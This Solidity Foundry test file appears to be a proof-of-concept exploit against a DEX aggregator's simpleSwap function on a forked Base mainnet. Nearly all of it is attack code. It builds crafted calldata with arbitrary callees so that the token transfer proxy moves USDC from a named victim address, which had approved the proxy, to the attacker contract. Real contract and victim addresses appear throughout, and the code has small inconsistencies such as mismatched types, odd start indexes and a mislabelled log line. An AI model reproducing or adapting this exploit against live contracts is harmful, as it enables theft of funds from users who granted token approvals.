// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console, Test} from "forge-std/Test.sol";
import "../test/interfaces/IERC20.sol";

interface ITokenTransferProxy {
    function transferFrom(
        address token,
        address from,
        address to,
        uint256 amount
    ) external;
}


interface IAugustusSwapper {
    function simpleSwap(Utils.SimpleData memory data) external payable returns (uint256 receivedAmount);
}

library Utils {
    struct SimpleData {
        address fromToken;
        address toToken;
        uint256 fromAmount;
        uint256 toAmount;
        uint256 expectedAmount;
        address[] callees;
        bytes exchangeData;
        uint256[] startIndexes;
        uint256[] values;
        address payable beneficiary;
        address payable partner;
        uint256 feePercent;
        bytes permit;
        uint256 deadline;
        bytes16 uuid;
    }
}

interface Ismartrouter {
    struct ExactInputParams {
        bytes path;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
    }

    function exactInput(ExactInputParams calldata params) external payable returns (uint256 amountOut);
    
}


contract vaulttTest is Test {
    IAugustusSwapper AugustusSwapper = IAugustusSwapper(0x59C7C832e96D2568bea6db468C1aAdcbbDa08A52);
    address constant vic = 0x249c90E06941F22b5746fE235126df75870738BC;
    IERC20 usdc = IERC20(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);
    IERC20 weth = IERC20(0x4200000000000000000000000000000000000006);
    ITokenTransferProxy proxyContract = ITokenTransferProxy(0x93aAAe79a53759cD164340E4C8766E4Db5331cD7);
    address attacker = 0x59C7C832e96D2568bea6db468C1aAdcbbDa08A52;
    uint256 public constant ONE_YEAR = 365 days;
    Ismartrouter smartRouter = Ismartrouter(0x4030EbAFEb76e5FC848891076dFe315993800ba5);

    function setUp() public {
        vm.createSelectFork("https://developer-access-mainnet.base.org", 20295659);
        deal(address(usdc), address(this), 20 ether);
        attacker = msg.sender;
    }

    function testExploit() external {
        emit log_named_decimal_uint("[Before] Attacker USDC balance", usdc.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[Before] Attacker USDC balance", usdc.balanceOf(address(0xB0D21Ae81032d1d1b37ec51638240C0dc759473B)), 18);
        attack();
        emit log_named_decimal_uint("[Before] Attacker USDC balance", usdc.balanceOf(address(this)), 18);
    }

    function attack() internal {
        IERC20(usdc).approve(address(proxyContract), IERC20(usdc).balanceOf(address(this)));

        uint256 allowance = usdc.allowance(vic, address(proxyContract));
        uint256 balance = usdc.balanceOf(vic);
        uint256 amuntToDrain = balance < allowance ? balance : allowance;

        bytes memory transdata = abi.encodeWithSignature(
            "executeTransferFrom(address,address,address,address,uint256)", 
            proxyContract,
            usdc, 
            vic, 
            address(this), 
            90000000000000
        );
        uint256 deadlines = block.timestamp + 24 hours;
        address recipient = address(AugustusSwapper);
        uint256 amountIn = 10 ether;
        uint256 amountOutMinimum = 8 ether;
        bytes memory path = abi.encodePacked(
            address(usdc), 
            uint24(500),      
            address(weth)  
        );
        Ismartrouter.ExactInputParams memory params = Ismartrouter.ExactInputParams({
            path: path,
            recipient: recipient,
            deadline: deadlines,
            amountIn: amountIn,
            amountOutMinimum: amountOutMinimum
        });

        bytes memory transpdata = abi.encodeWithSignature(
            "exactInput((bytes,address,uint256,uint256,uint256))",
            params
        );

        bytes memory exchangeData = abi.encodePacked(transdata, transpdata);
        bytes memory exchangeswapData = transpdata;
        uint256 lengthOfTransfData = exchangeData.length;
        uint256 lengthOfswapfData = exchangeswapData.length;
        
        address[] memory callees = new address[](2);
        callees[0] = address(attacker);
        callees[1] = address(smartRouter);
        uint256[] memory startIndexes = new uint256[](3);
        startIndexes[0] = 0;
        startIndexes[1] = lengthOfTransfData;
        startIndexes[2] = lengthOfswapfData;
        uint256[] memory values = new uint256[](2);
        values[0] = 0;
        values[1] = 0;
        address fromToken = address(usdc);
        address toToken = address(weth);
        uint256 fromAmount = 10 ether;
        uint256 toAmount = 10 ether;
        uint256 expectedAmount = 9 ether;
        address payable partner = payable(address(0));
        uint256 feePercent = 0;
        bytes memory permit = "";
        address payable beneficiary = payable(address(this));
        uint256 deadline = block.timestamp + 24 hours;
        bytes32 uuid = 0;

        Utils.SimpleData memory data = Utils.SimpleData({
            callees: callees,
            exchangeData: exchangeData,
            startIndexes: startIndexes,
            values: values,
            fromToken: fromToken,
            toToken: toToken,
            fromAmount: fromAmount,
            toAmount: toAmount,
            expectedAmount: expectedAmount,
            partner: partner,
            feePercent: feePercent,
            permit: permit,
            beneficiary: beneficiary,
            deadline: deadline,
            uuid: 0
        });

        bytes memory rawCalldata = abi.encodeWithSelector(
            IAugustusSwapper.simpleSwap.selector,
            data
        );
        (bool success, ) = address(AugustusSwapper).call(rawCalldata);

        
        emit log_named_bytes("Raw calldata for openPosition:", rawCalldata);

        IAugustusSwapper(AugustusSwapper).simpleSwap(data);
    }

    function executeTransferFrom(
        address proxyContract, 
        address token,          
        address from,          
        address to,             
        uint256 amount          
    ) external returns (bool success, bytes memory result) {
        
        bytes memory data = abi.encodeWithSignature(
            "transferFrom(address,address,address,uint256)", 
            token, 
            from, 
            to,
            amount
        );
        (success, result) = proxyContract.call(data);
        require(success, "Token transfer failed.");
    }

    receive() external payable {}
}